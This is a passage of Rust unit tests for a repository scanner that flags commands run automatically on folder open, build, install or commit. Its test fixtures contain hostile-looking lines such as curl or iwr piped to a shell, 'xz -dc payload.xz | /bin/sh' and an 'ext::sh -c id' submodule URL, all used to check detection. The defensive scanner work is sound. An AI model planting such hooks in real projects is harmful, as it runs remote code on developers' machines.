        assert_eq!(s[0].line, 8);
        assert_eq!(s[0].dir, "");
        // A task that hides its output says so in the file's finding.
        assert!(
            named(&out, "autorun.inventory")
                .why
                .contains("reveal never")
        );
    }

    #[test]
    fn a_task_that_shows_its_output_adds_no_hidden_note() {
        let (_, out) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[{"label":"a","command":"npm run watch","runOptions":{"runOn":"folderOpen"},"presentation":{"reveal":"always"}}]}"#,
        );
        assert!(
            !named(&out, "autorun.inventory")
                .why
                .contains("reveal never")
        );
    }

    #[test]
    fn vscode_repo_watch_task_is_medium_not_high() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"version":"2.0.0","tasks":[{"label":"watch","type":"npm","script":"watch","isBackground":true,"runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(commands(&s), ["npm run watch"]);
        let shape = shape::classify(&s[0].command);
        let level = shape::severity(s[0].trigger, shape, None).max(s[0].floor);
        assert_eq!(level, Severity::Medium);
    }

    #[test]
    fn tasks_that_do_not_run_on_folder_open_are_not_surfaces() {
        let (s, out) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[{"label":"a","command":"make","runOptions":{"runOn":"default"}},{"label":"b","command":"make","runOptions":{"reevaluateOnRerun":true}},{"label":"c","command":"make"}]}"#,
        );
        assert!(s.is_empty() && out.is_empty(), "{s:?} {out:?}");
    }

    #[test]
    fn a_folder_open_task_runs_what_it_depends_on_and_what_its_platforms_override() {
        let (s, _) = run(
            ".vscode/tasks.json",
            r#"{"tasks":[
  {"label":"boot","dependsOn":["fetch","boot"],"runOptions":{"runOn":"folderOpen"}},
  {"label":"fetch","type":"shell","command":"curl -s https://example.invalid/x | sh",
   "windows":{"command":"powershell","args":["-c","iwr https://example.invalid/x | iex"]}}
]}"#,
        );
        assert_eq!(
            commands(&s),
            [
                "curl -s https://example.invalid/x | sh",
                "powershell -c \"iwr https://example.invalid/x | iex\""
            ]
        );
        all_are(
            &s,
            "autorun.vscode-folder-open",
            Trigger::Open,
            Severity::Info,
        );
    }

    #[test]
    fn cursor_tasks_and_nested_folders_count_too() {
        let (s, _) = run(
            "app/.cursor/tasks.json",
            r#"{"tasks":[{"label":"a","command":{"value":"node"},"args":[{"value":"a.js","quoting":"strong"}],"runOptions":{"runOn":"folderOpen"}}]}"#,
        );
        assert_eq!(commands(&s), ["node a.js"]);
        assert_eq!(s[0].dir, "app");
        // A tasks.json outside an editor folder is not read.
        let (s, out) = run("docs/tasks.json", TASKS);
        assert!(s.is_empty() && out.is_empty());
    }

    #[test]
    fn a_tasks_file_the_parser_rejects_is_reported() {
        let (s, out) = run(".vscode/tasks.json", r#"{"tasks": ["#);
        assert!(s.is_empty());
        let f = named(&out, "autorun.unparsed");
        assert_eq!(
            (f.severity, f.path.as_str()),
            (Severity::High, ".vscode/tasks.json")
        );
    }

    // devcontainer

    #[test]
    fn initialize_command_runs_on_the_host() {
        let (s, _) = run(
            ".devcontainer/devcontainer.json",
            r#"{
  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
  "features": { "ghcr.io/devcontainers/features/node:1": {} },
  "initializeCommand": "echo hi",
  "postCreateCommand": "npm install"
}"#,
        );
        assert_eq!(commands(&s), ["echo hi"]);
        all_are(
            &s,
            "autorun.devcontainer-host",
            Trigger::Open,
            Severity::Info,
        );
        assert_eq!(s[0].line, 4);
    }

    #[test]
    fn initialize_command_takes_a_string_an_array_or_an_object() {
        let (s, _) = run(
            ".devcontainer.json",
            r#"{"initializeCommand":["node","my script.js"]}"#,
        );
        assert_eq!(commands(&s), ["node \"my script.js\""]);
        let (s, _) = run(
            ".devcontainer/web/devcontainer.json",
            r#"{"initializeCommand":{"a":"node a.js","b":["node","b.js"]}}"#,
        );
        assert_eq!(commands(&s), ["node a.js", "node b.js"]);
        let (s, out) = run(".devcontainer/devcontainer.json", r#"{"image":"x"}"#);
        assert!(s.is_empty() && out.is_empty());
        // A devcontainer.json elsewhere is not a devcontainer.
        let (s, _) = run("docs/devcontainer.json", r#"{"initializeCommand":"x"}"#);
        assert!(s.is_empty());
    }

    #[test]
    fn a_devcontainer_the_parser_rejects_is_reported() {
        let (_, out) = run(".devcontainer.json", "{ initializeCommand }");
        assert_eq!(named(&out, "autorun.unparsed").severity, Severity::High);
    }

    #[test]
    fn privileged_containers_are_medium() {
        for text in [
            r#"{"privileged": true}"#,
            r#"{"mounts":["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"]}"#,
            r#"{"mounts":[{"source":"/var/run/docker.sock","target":"/x","type":"bind"}]}"#,
            r#"{"capAdd":["NET_ADMIN","SYS_ADMIN"]}"#,
            r#"{"runArgs":["--privileged"]}"#,
        ] {
            let (s, out) = run(".devcontainer/devcontainer.json", text);
            assert!(s.is_empty());
            let f = named(&out, "autorun.devcontainer-privileged");
            assert_eq!(f.severity, Severity::Medium, "{text}");
            assert_eq!(f.group, Group::Autorun);
        }
    }

    #[test]
    fn unprivileged_containers_are_not_flagged() {
        let (_, out) = run(
            ".devcontainer/devcontainer.json",
            r#"{"privileged":false,"capAdd":["NET_ADMIN"],"mounts":["source=cache,target=/cache,type=volume"],"runArgs":["--init"]}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    // Makefile, *.mk, *.m4, configure

    #[test]
    fn a_makefile_line_that_downloads_and_runs_is_a_build_surface() {
        let mk = "all:\n\tgcc -o a a.c\n\t# curl https://example.invalid/x | sh\n# curl https://example.invalid/y | sh\nfetch:\n\t@curl -fsSL https://example.invalid/i.sh | sh\n\tcurl -O https://example.invalid/data.tgz\n";
        let (s, _) = run("Makefile", mk);
        assert_eq!(
            commands(&s),
            ["curl -fsSL https://example.invalid/i.sh | sh"]
        );
        all_are(&s, "autorun.build-script", Trigger::Build, Severity::Info);
        assert_eq!(lines(&s), [6]);
    }

    #[test]
    fn a_continued_makefile_line_is_one_command() {
        let mk = "x:\n\tcurl -fsSL https://example.invalid/i.sh \\\n\t  | sh\n";
        let (s, _) = run("sub/Makefile", mk);
        assert_eq!(
            commands(&s),
            ["curl -fsSL https://example.invalid/i.sh | sh"]
        );
        assert_eq!((s[0].line, s[0].dir.as_str()), (2, "sub"));
    }

    #[test]
    fn m4_mk_and_configure_files_are_read_the_same_way() {
        let body = "AC_DEFUN([X],[\n  xz -dc payload.xz | /bin/sh\n])\n";
        for path in ["m4/build.m4", "rules.mk", "configure"] {
            let (s, _) = run(path, body);
            assert_eq!(commands(&s), ["xz -dc payload.xz | /bin/sh"], "{path}");
            assert_eq!(s[0].rule, "autorun.build-script");
        }
        // `dnl` starts a comment in m4 only.
        let dnl = "dnl curl https://example.invalid/x | sh\n";
        assert!(run("m4/build.m4", dnl).0.is_empty());
        assert_eq!(run("rules.mk", dnl).0.len(), 1);
    }

    #[test]
    fn plain_and_network_only_build_lines_are_not_surfaces() {
        let mk =
            "all:\n\tgcc -o a a.c\n\tcurl -O https://example.invalid/data.tgz\n\tnpx prettier .\n";
        let (s, out) = run("Makefile", mk);
        assert!(s.is_empty() && out.is_empty());
        // A file that is not a build file is not read.
        let (s, _) = run("notes.txt", "curl https://example.invalid/x | sh\n");
        assert!(s.is_empty());
        let (s, _) = run("Makefile.am", "curl https://example.invalid/x | sh\n");
        assert!(s.is_empty());
    }

    // .envrc, .pre-commit-config.yaml, .husky, Justfile, Taskfile.yml

    #[test]
    fn envrc_lines_are_opt_in_surfaces() {
        let (s, _) = run(
            "app/.envrc",
            "# comment\nuse flake\nexport TOKEN=abc\ncurl https://example.invalid/x | sh\n",
        );
        assert_eq!(
            commands(&s),
            [
                "use flake",
                "export TOKEN=abc",
                "curl https://example.invalid/x | sh"
            ]
        );
        all_are(&s, "autorun.envrc", Trigger::OptIn, Severity::Info);
        assert_eq!((lines(&s), s[0].dir.as_str()), (vec![2, 3, 4], "app"));
        let (s, out) = run(".envrc", "# nothing here\n\n");
        assert!(s.is_empty() && out.is_empty());
    }

    const PRE_COMMIT: &str = "repos:
  - repo: local
    hooks:
      - id: lint
        name: lint
        entry: ./scripts/lint.sh --fix
        language: system
        files: \\.py$
      - id: fmt
        name: fmt
        language: python
        entry: black
      - id: gen
        language: 'system'
        entry: \"node gen.js\"
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-yaml
";

    #[test]
    fn pre_commit_entries_with_language_system_are_opt_in_surfaces() {
        let (s, _) = run(".pre-commit-config.yaml", PRE_COMMIT);
        assert_eq!(commands(&s), ["./scripts/lint.sh --fix", "node gen.js"]);
        all_are(
            &s,
            "autorun.pre-commit-hook",
            Trigger::OptIn,
            Severity::Info,
        );
        assert_eq!(lines(&s), [6, 15]);
    }

    #[test]
    fn pre_commit_hooks_in_other_languages_are_not_surfaces() {
        let (s, out) = run(
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: fmt\n        language: python\n        entry: black\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    #[test]
    fn husky_hook_lines_are_opt_in_surfaces() {
        let (s, _) = run(
            ".husky/pre-commit",
            "#!/usr/bin/env sh\n. \"$(dirname -- \"$0\")/_/husky.sh\"\n\nnpx lint-staged\n",
        );
        assert_eq!(
            commands(&s),
            [". \"$(dirname -- \"$0\")/_/husky.sh\"", "npx lint-staged"]
        );
        all_are(&s, "autorun.husky-hook", Trigger::OptIn, Severity::Info);
        assert_eq!(lines(&s), [2, 4]);
        let (s, _) = run("app/.husky/pre-push", "npm test\n");
        assert_eq!((commands(&s), s[0].dir.as_str()), (vec!["npm test"], "app"));
    }

    #[test]
    fn husky_generated_helpers_are_not_hooks() {
        // What husky writes is not a hook of the repo; a file it did not write there is.
        let (s, out) = run(".husky/_/husky.sh", HUSKY_V9_SH);
        assert!(s.is_empty() && out.is_empty());
        let (s, _) = run(".husky/_/husky.sh", "echo helper\n");
        assert_eq!(commands(&s), ["echo helper"]);
        let (s, _) = run("husky/pre-commit", "npm test\n");
        assert!(s.is_empty());
    }

    #[test]
    fn justfile_recipe_lines_are_opt_in_surfaces() {
        let jf = "set shell := [\"bash\", \"-c\"]\nversion := \"1.0\"\n\nbuild:\n    cargo build --release\n\nfetch: build\n    @curl -fsSL https://example.invalid/i.sh | sh\n    # a comment\n";
        for path in ["Justfile", "justfile", ".justfile"] {
            let (s, _) = run(path, jf);
            assert_eq!(
                commands(&s),
                [
                    "cargo build --release",
                    "curl -fsSL https://example.invalid/i.sh | sh"
                ],
                "{path}"
            );
            all_are(&s, "autorun.justfile", Trigger::OptIn, Severity::Info);
            assert_eq!(lines(&s), [5, 8]);
        }
        let (s, out) = run(
            "Justfile",
            "set shell := [\"bash\"]\nx := \"1\"\nall: build\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    const TASKFILE: &str = "version: '3'
tasks:
  build:
    cmds:
      - go build ./...
      - cmd: ./gen.sh
      - task: other
      - |
        curl -fsSL https://example.invalid/i.sh | sh
        echo done
  lint:
    cmd: golangci-lint run
  deps-only:
    deps: [build]
    desc: \"say cmd: x\"
";

    #[test]
    fn taskfile_commands_are_opt_in_surfaces() {
        let (s, _) = run("Taskfile.yml", TASKFILE);
        assert_eq!(
            commands(&s),
            [
                "go build ./...",
                "./gen.sh",
                "curl -fsSL https://example.invalid/i.sh | sh",
                "echo done",
                "golangci-lint run"
            ]
        );
        all_are(&s, "autorun.taskfile", Trigger::OptIn, Severity::Info);
        let mut sorted = lines(&s);
        sorted.sort_unstable();
        assert_eq!(sorted, [5, 6, 9, 10, 12]);
        let (s, _) = run("sub/taskfile.yaml", "tasks:\n  a:\n    cmd: make\n");
        assert_eq!((commands(&s), s[0].dir.as_str()), (vec!["make"], "sub"));
        let (s, out) = run(
            "Taskfile.yml",
            "version: '3'\ntasks:\n  a:\n    deps: [b]\n",
        );
        assert!(s.is_empty() && out.is_empty());
    }

    // MSBuild

    const CSPROJ: &str = r#"<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="Gen" BeforeTargets="Build">
    <Exec Command="dotnet tool run gen &amp;&amp; echo ok" />
    <Exec WorkingDirectory="x" Condition="'$(A)' &gt; '1'" Command='curl -s https://example.invalid/i.sh | sh' />
  </Target>
  <PropertyGroup>
    <PreBuildEvent>node prebuild.js
call post.bat</PreBuildEvent>
    <PostBuildEvent>echo done</PostBuildEvent>
  </PropertyGroup>
</Project>"#;

    #[test]
    fn msbuild_exec_and_build_events_are_build_surfaces() {
        for path in ["app/App.csproj", "Directory.Build.props", "build/x.targets"] {
            let (s, _) = run(path, CSPROJ);
            assert_eq!(
                commands(&s),
                [
                    "dotnet tool run gen && echo ok",
                    "curl -s https://example.invalid/i.sh | sh",
                    "node prebuild.js",
                    "call post.bat",
                    "echo done"
                ],
                "{path}"
            );
            all_are(&s, "autorun.msbuild-exec", Trigger::Build, Severity::Info);
        }
        let (s, _) = run("app/App.csproj", CSPROJ);
        assert_eq!(lines(&s), [3, 4, 7, 8, 9]);
        assert_eq!(s[0].dir, "app");
    }

    #[test]
    fn a_project_file_without_commands_is_not_a_surface() {
        let (s, out) = run(
            "App.csproj",
            r#"<Project><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><Target Name="x"><Message Text="hi" /></Target></Project>"#,
        );
        assert!(s.is_empty() && out.is_empty());
        let (s, _) = run("App.xml", CSPROJ);
        assert!(s.is_empty());
    }

    // Python and Rust build hooks

    #[test]
    fn setup_py_cmdclass_that_overrides_install_is_medium() {
        let src = "from setuptools import setup\nfrom setuptools.command.install import install\nclass Evil(install):\n    def run(self):\n        pass\nsetup(name='x', cmdclass={'build_ext': B, 'install': Evil})\n";
        let (_, out) = run("setup.py", src);
        let f = named(&out, "autorun.setup-py-cmdclass");
        assert_eq!(
            (f.severity, f.line, f.group),
            (Severity::Medium, 6, Group::Autorun)
        );
        for src in [
            "setup(cmdclass=dict(develop=X))\n",
            "cmdclass = {}\ncmdclass['egg_info'] = X\nsetup(cmdclass=cmdclass)\n",
            "setup(\n    cmdclass={\n        \"egg_info\": X,\n    },\n)\n",
        ] {
            let (_, out) = run("pkg/setup.py", src);
            assert!(rules(&out).contains(&"autorun.setup-py-cmdclass"), "{src}");
        }
    }

    #[test]
    fn setup_py_always_runs_when_the_package_installs() {
        // With or without a cmdclass: a surface the orchestrator rates, so a HIGH finding in
        // setup.py reaches CRITICAL. The command names the file for `files_run`.
        for (path, src, dir) in [
            ("setup.py", "setup(name='x')\n", ""),
            ("pkg/setup.py", "setup(cmdclass={'install': X})\n", "pkg"),
        ] {
            let (s, _) = run(path, src);
            assert_eq!(commands(&s), ["python setup.py"], "{path}");
            all_are(&s, "autorun.setup-py", Trigger::Install, Severity::Info);
            assert_eq!((s[0].path.as_str(), s[0].dir.as_str()), (path, dir));
            assert_eq!(shape::files_run(&s[0].command), ["setup.py"]);
        }
        let (s, _) = run("docs/setup.txt", "setup(name='x')\n");
        assert!(s.is_empty());
    }

    #[test]
    fn setup_py_without_an_overriding_cmdclass_is_clean() {
        for src in [
            "setup(name='x')\n",
            "setup(name='x', cmdclass={'build_ext': build_ext})\n",
            "setup(name='x', cmdclass=dict(build_py=B))\n",
            "# cmdclass is not used\nsetup(name='install')\n",
        ] {
            let (_, out) = run("setup.py", src);
            assert!(!rules(&out).contains(&"autorun.setup-py-cmdclass"), "{src}");
        }
    }

    #[test]
    fn pyproject_backend_path_is_medium() {
        let src = "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"backend\"\nbackend-path = [\"_build\"]\n";
        let (_, out) = run("pyproject.toml", src);
        let f = named(&out, "autorun.pyproject-backend-path");
        assert_eq!((f.severity, f.line), (Severity::Medium, 4));
    }

    #[test]
    fn a_pyproject_with_a_published_backend_is_clean() {
        let (_, out) = run(
            "pyproject.toml",
            "[project]\nname = \"flask\"\n\n[build-system]\nrequires = [\"flit_core<4\"]\nbuild-backend = \"flit_core.buildapi\"\n\n[tool.x]\nbackend-path = \"y\"\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn build_rs_is_an_info_finding() {
        for path in ["build.rs", "crates/x/build.rs"] {
            let (s, out) = run(path, "fn main() {}\n");
            assert!(s.is_empty());
            let f = named(&out, "autorun.build-rs");
            assert_eq!(
                (f.severity, f.path.as_str(), f.line),
                (Severity::Info, path, 0)
            );
        }
        for path in ["src/rebuild.rs", "build.rs.bak", "build.rss"] {
            let (_, out) = run(path, "fn main() {}\n");
            assert!(out.is_empty(), "{path}");
        }
    }

    #[test]
    fn cargo_config_that_names_a_program_is_high() {
        for (text, line) in [
            ("[build]\nrustc-wrapper = \"./w.sh\"\n", 2),
            ("[build]\njobs = 4\nrustc = \"./rustc\"\n", 3),
            ("[build]\nrustc-workspace-wrapper = \"tools/x\"\n", 2),
            (
                "[target.x86_64-unknown-linux-gnu]\nrunner = \"./run.sh\"\n",
                2,
            ),
            ("[target.'cfg(unix)']\nrunner = [\"./run.sh\"]\n", 2),
            ("build.rustc-wrapper = \"./x\"\n", 1),
        ] {
            for path in [
                ".cargo/config.toml",
                ".cargo/config",
                "app/.cargo/config.toml",
            ] {
                let (s, out) = run(path, text);
                assert!(s.is_empty());
                let f = named(&out, "autorun.cargo-config");
                assert_eq!((f.severity, f.line), (Severity::High, line), "{text}");
            }
        }
    }

    #[test]
    fn cargo_config_that_names_an_installed_program_is_medium() {
        // A bare name is found on PATH, not in the repo: sccache and test runners.
        for text in [
            "[build]\nrustc-wrapper = \"sccache\"\n",
            "[build]\nrustc-workspace-wrapper = 'sccache'\n",
            "[target.thumbv7em-none-eabihf]\nrunner = \"probe-rs run --chip nRF52840\"\n",
            "[target.wasm32-unknown-unknown]\nrunner = [\"wasmtime\", \"--dir=.\"]\n",
            "[target.'cfg(all())']\nrunner = \"wasm-bindgen-test-runner\"\n",
        ] {
            let (_, out) = run(".cargo/config.toml", text);
            assert_eq!(
                named(&out, "autorun.cargo-config").severity,
                Severity::Medium,
                "{text}"
            );
        }
        // A path into the repo, or a bare name with a path argument first, is repo code.
        let (_, out) = run(
            ".cargo/config.toml",
            "[build]\nrustc-wrapper = \"./sccache\"\n",
        );
        assert_eq!(named(&out, "autorun.cargo-config").severity, Severity::High);
    }

    #[test]
    fn cargo_config_env_and_source_tables_are_medium() {
        for text in [
            "[env]\nFOO = \"bar\"\n",
            "[env.FOO]\nvalue = \"bar\"\n",
            "[source.crates-io]\nreplace-with = \"vendored\"\n",
            "[source.vendored]\ndirectory = \"vendor\"\n",
        ] {
            let (_, out) = run(".cargo/config.toml", text);
            assert_eq!(
                named(&out, "autorun.cargo-config").severity,
                Severity::Medium,
                "{text}"
            );
        }
        // The strongest entry sets the level.
        let (_, out) = run(
            ".cargo/config.toml",
            "[env]\nA = \"1\"\n[build]\nrustc = \"./x\"\n",
        );
        assert_eq!(rules(&out), ["autorun.cargo-config"]);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn plain_cargo_config_is_clean() {
        let (_, out) = run(
            ".cargo/config.toml",
            "[build]\njobs = 4\n[alias]\nrunner = \"run --release\"\nb = \"build\"\n[term]\nverbose = true\n",
        );
        assert!(out.is_empty(), "{out:?}");
        let (_, out) = run("config.toml", "[build]\nrustc = \"x\"\n");
        assert!(out.is_empty());
    }

    #[test]
    fn rust_toolchain_path_is_high() {
        for path in [
            "rust-toolchain.toml",
            "rust-toolchain",
            "sub/rust-toolchain.toml",
        ] {
            let (_, out) = run(path, "[toolchain]\npath = \"./tc\"\n");
            let f = named(&out, "autorun.rust-toolchain-path");
            assert_eq!((f.severity, f.line), (Severity::High, 2), "{path}");
        }
        for text in ["[toolchain]\nchannel = \"1.80\"\n", "stable\n"] {
            let (_, out) = run("rust-toolchain.toml", text);
            assert!(out.is_empty(), "{text}");
        }
    }

    // Gradle and Maven wrappers

    #[test]
    fn gradle_wrapper_from_another_host_is_high() {
        for url in [
            r"https\://example.invalid/distributions/gradle-8.5-bin.zip",
            r"https\://services.gradle.org@example.invalid/g.zip",
            "http://example.invalid/g.zip",
            r"file\:///tmp/g.zip",
        ] {
            let text = format!("distributionBase=GRADLE_USER_HOME\ndistributionUrl={url}\n");
            for path in [
                "gradle/wrapper/gradle-wrapper.properties",
                "app/gradle/wrapper/gradle-wrapper.properties",
            ] {
                let (_, out) = run(path, &text);
                let f = named(&out, "autorun.gradle-wrapper");
                assert_eq!((f.severity, f.line), (Severity::High, 2), "{url}");
            }
        }
    }

    #[test]
    fn gradle_wrapper_from_the_official_host_is_clean() {
        for url in [
            r"https\://services.gradle.org/distributions/gradle-8.5-bin.zip",
            "https://services.gradle.org/distributions/gradle-8.5-bin.zip",
            r"https\://SERVICES.GRADLE.ORG:443/distributions/gradle-8.5-bin.zip",
            r"https\://user:pw@services.gradle.org/distributions/gradle-8.5-bin.zip",
        ] {
            let text = format!("distributionUrl={url}\nzipStoreBase=GRADLE_USER_HOME\n");
            let (_, out) = run("gradle/wrapper/gradle-wrapper.properties", &text);
            assert!(out.is_empty(), "{url}: {out:?}");
        }
        let (_, out) = run(
            "gradle.properties",
            "distributionUrl=https://example.invalid/x\n",
        );
        assert!(out.is_empty());
    }

    #[test]
    fn a_gradle_wrapper_jar_is_info_even_when_it_is_not_text() {
        let f = FileCtx {
            path: "gradle/wrapper/gradle-wrapper.jar",
            bytes: b"PK\x03\x04",
            text: None,
            kind: FileKind::Binary,
            truncated: false,
        };
        let mut out = Vec::new();
        assert!(surfaces(&f, &mut out).is_empty());
        let found = named(&out, "autorun.gradle-wrapper");
        assert_eq!(
            (found.severity, found.path.as_str()),
            (Severity::Info, "gradle/wrapper/gradle-wrapper.jar")
        );
        let (_, out) = run("lib/gradle-wrapper.jar", "x");
        assert!(out.is_empty());
    }

    #[test]
    fn maven_extensions_are_medium() {
        let (_, out) = run(".mvn/extensions.xml", "<extensions/>");
        let f = named(&out, "autorun.maven-extensions");
        assert_eq!(
            (f.severity, f.path.as_str()),
            (Severity::Medium, ".mvn/extensions.xml")
        );
        let (_, out) = run("src/extensions.xml", "<extensions/>");
        assert!(out.is_empty());
    }

    #[test]
    fn maven_wrapper_from_another_host_is_high() {
        let text = "distributionUrl=https://repo.maven.apache.org/maven2/apache-maven-3.9.6-bin.zip\nwrapperUrl=https://example.invalid/maven-wrapper.jar\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        let f = named(&out, "autorun.maven-extensions");
        assert_eq!((f.severity, f.line), (Severity::High, 2));
        let text = "distributionUrl=https://example.invalid/apache-maven-3.9.6-bin.zip\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        assert_eq!(
            named(&out, "autorun.maven-extensions").severity,
            Severity::High
        );
    }

    #[test]
    fn maven_wrapper_from_the_official_host_is_clean() {
        let text = "distributionUrl=https://repo.maven.apache.org/maven2/apache-maven-3.9.6-bin.zip\nwrapperUrl=https://repo.maven.apache.org/maven2/maven-wrapper-3.2.0.jar\n";
        let (_, out) = run(".mvn/wrapper/maven-wrapper.properties", text);
        assert!(out.is_empty(), "{out:?}");
    }

    // VS Code settings

    #[test]
    fn settings_that_hide_the_vscode_folder_are_high() {
        for key in [".vscode", "**/.vscode", ".vscode/**", "**/.vscode/**"] {
            let text = format!("{{\"files.exclude\": {{\"**/.git\": true, \"{key}\": true}}}}");
            let (_, out) = run(".vscode/settings.json", &text);
            assert_eq!(
                named(&out, "autorun.vscode-hidden").severity,
                Severity::High,
                "{key}"
            );
        }
    }

    #[test]
    fn settings_that_hide_a_folder_that_only_starts_like_vscode_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"files.exclude": {".vscode-test": true, "**/.vscode-test/**": true, "**/.vscode-insiders": true, "x.vscode": true}}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn settings_that_hide_other_things_are_clean() {
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"files.exclude": {"**/.git": true, "**/node_modules": true, "**/.vscode": false}, "editor.fontSize": 12}"#,
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn terminal_env_settings_are_medium() {
        let (_, out) = run(
            ".vscode/settings.json",
            "{\n  // comment\n  \"terminal.integrated.env.linux\": {\"NODE_OPTIONS\": \"--require ./x.js\"}\n}",
        );
        let f = named(&out, "autorun.vscode-env");
        assert_eq!((f.severity, f.line), (Severity::Medium, 3));
        let (_, out) = run(
            ".vscode/settings.json",
            r#"{"terminal.integrated.fontSize": 12}"#,
        );
        assert!(out.is_empty());
    }

    // git files

    #[test]
    fn a_gitmodules_file_with_a_cr_a_dotdot_or_a_bad_url_is_high() {
        for text in [
            "[submodule \"a\"]\n\tpath = deps/a\r\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = ../../.git/hooks\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = x/../y\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = http://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = file:///tmp/a\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = ext::sh -c id\n",
            "[submodule \"a\"]\n\tpath = a\n\turl = git://example.invalid/a.git\n",
        ] {
            let (s, out) = run(".gitmodules", text);
            assert!(s.is_empty());
            assert_eq!(rules(&out), ["autorun.gitmodules"], "{text:?}");
            assert_eq!(out[0].severity, Severity::High, "{text:?}");
        }
    }

    #[test]
    fn an_ordinary_gitmodules_file_is_info() {
        for text in [
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = https://example.invalid/a.git\n",
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = ssh://git@example.invalid/a.git\n[submodule \"b\"]\n\tpath = deps/b\n\turl = git@example.invalid:o/b.git\n",
            "[submodule \"a\"]\n\tpath = deps/a\n\turl = ../a.git\n",
            // A file that is CRLF throughout has no stray CR.
            "[submodule \"a\"]\r\n\tpath = deps/a\r\n\turl = https://example.invalid/a.git\r\n",
        ] {
            let (_, out) = run(".gitmodules", text);
            assert_eq!(rules(&out), ["autorun.gitmodules"], "{text:?}");
            assert_eq!(out[0].severity, Severity::Info, "{text:?}");
        }
        let (_, out) = run(".gitmodules", "# no submodules\n");
        assert!(out.is_empty());
    }

    #[test]
    fn a_gitattributes_filter_is_low() {
        let (s, out) = run(
            ".gitattributes",
            "# comment\n*.txt text eol=lf\n*.bin filter=lfs diff=lfs\n*.dat filter=scrub -text\n",
        );
        assert!(s.is_empty());
        let f = named(&out, "autorun.gitattributes-filter");
        assert_eq!((f.severity, f.line), (Severity::Low, 3));
        assert_eq!(f.seen, "lfs scrub");
        let (_, out) = run(
            "sub/.gitattributes",
            "* text=auto\n*.png binary\n-filter\n*.x !filter\n[attr]m filter=\n",
        );
        assert!(out.is_empty(), "{out:?}");
    }

    #[test]
    fn a_filter_that_another_file_tells_you_to_configure_is_high() {
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n*.bin filter=lfs\n");
        let readme = ctx(
            "README.md",
            "Run: git config filter.scrub.smudge ./scrub.sh\n",
        );
        raise_gitattributes_filters(&readme, &mut out);
        let f = named(&out, "autorun.gitattributes-filter");
        assert_eq!(f.severity, Severity::High);
        assert!(f.why.contains("scrub"), "{}", f.why);
        // A flag between the words still matches.
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n");
        let setup = ctx("setup.sh", "git config --local filter.scrub.clean 'sh x'\n");
        raise_gitattributes_filters(&setup, &mut out);
        assert_eq!(out[0].severity, Severity::High);
    }

    #[test]
    fn an_unrelated_file_leaves_a_gitattributes_filter_low() {
        let (_, mut out) = run(".gitattributes", "*.dat filter=scrub\n");
        for (path, text) in [
            ("a.sh", "git config filter.other.clean x\n"),
            ("b.sh", "git config user.name x\n"),
            ("c.sh", "echo filter.scrub.clean\n"),
            (".gitattributes", "git config filter.scrub.clean x\n"),
        ] {
            raise_gitattributes_filters(&ctx(path, text), &mut out);
            assert_eq!(out[0].severity, Severity::Low, "{path}");
        }
        // A file that is not text is skipped.
        let bin = FileCtx {
            path: "a.bin",
            bytes: b"git config filter.scrub.clean x",
            text: None,
            kind: FileKind::Binary,
            truncated: false,
        };
        raise_gitattributes_filters(&bin, &mut out);
        assert_eq!(out[0].severity, Severity::Low);
    }

    #[test]
    fn every_entry_in_the_git_hooks_folder_is_high() {
        // The tree's paths, not the files that were read: a symlink or an unreadable file is an
        // entry too, and a symlinked hook is HIGH whatever it points at.
        let mut out = Vec::new();
        entry_findings(
            &[
                "a.txt",
                ".git/config",
                ".git/hooks/pre-commit",
                ".git/hooks/post-checkout",
                ".git/hooks/pre-push.sample",
                ".git/hooks/",
                "hooks/pre-commit",
                "sub/.git/hooks/x",
                "sub/git/hooks/y",
            ],
            &mut out,
        );
        let paths: Vec<&str> = out.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(
            paths,
            [
                ".git/hooks/pre-commit",
                ".git/hooks/post-checkout",
                "sub/.git/hooks/x"
            ]
        );
        for f in &out {
            assert_eq!(
                (f.rule.as_str(), f.severity, f.group, f.line, f.count),
                ("autorun.git-hooks", Severity::High, Group::Autorun, 0, 1)
            );
            assert!(!f.why.is_empty() && !f.action.is_empty());
        }
        assert_eq!(out[0].seen, "pre-commit");
    }

    #[test]
    fn reading_a_hook_file_adds_nothing_to_the_entry_finding() {
        let (s, out) = run(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
        assert!(s.is_empty() && out.is_empty(), "{out:?}");
    }

    #[test]
    fn git_config_that_names_a_program_is_high() {
        for text in [
            "[core]\n\tfsmonitor = ./hook.sh\n",
            "[core]\n\tsshCommand = ssh -i x\n",
            "[core]\n\tpager = sh -c id\n",
            "[core]\n\teditor = ./ed.sh\n",
            "[core]\n\thooksPath = .githooks\n",
            "[filter \"lfs\"]\n\tclean = ./c.sh\n",
